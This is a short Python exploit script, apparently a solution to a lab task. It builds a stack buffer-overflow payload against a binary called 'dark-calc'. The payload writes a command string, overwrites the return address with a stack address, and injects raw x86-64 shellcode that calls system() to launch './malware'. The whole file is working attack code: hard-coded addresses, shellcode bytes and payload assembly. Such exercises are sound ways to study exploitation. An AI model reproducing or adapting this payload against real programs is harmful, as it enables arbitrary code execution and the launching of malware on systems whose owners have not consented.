#!/usr/bin/env python3
"""Task 1: launch the lab malware through an executable-stack payload."""
import struct
import sys

STACK_TOP = 0x721000801000
BUFFER = STACK_TOP - 0x30
# The workflow runs dark-calc from inside attack/.
COMMAND = b"./malware"
SYSTEM_PLT = 0x4017e0
SHELLCODE = (
    b"\xb8"
    + struct.pack("<I", SYSTEM_PLT)
    + b"\xff\xd0"
    + b"\x31\xff\xb0\x3c\x0f\x05"
)

payload = (
    COMMAND
    + b"\x00"
    + b"A" * (24 - len(COMMAND) - 1)
    + struct.pack("<Q", BUFFER + 32)
    + SHELLCODE
    + b"\n"
)

sys.stdout.buffer.write(payload)
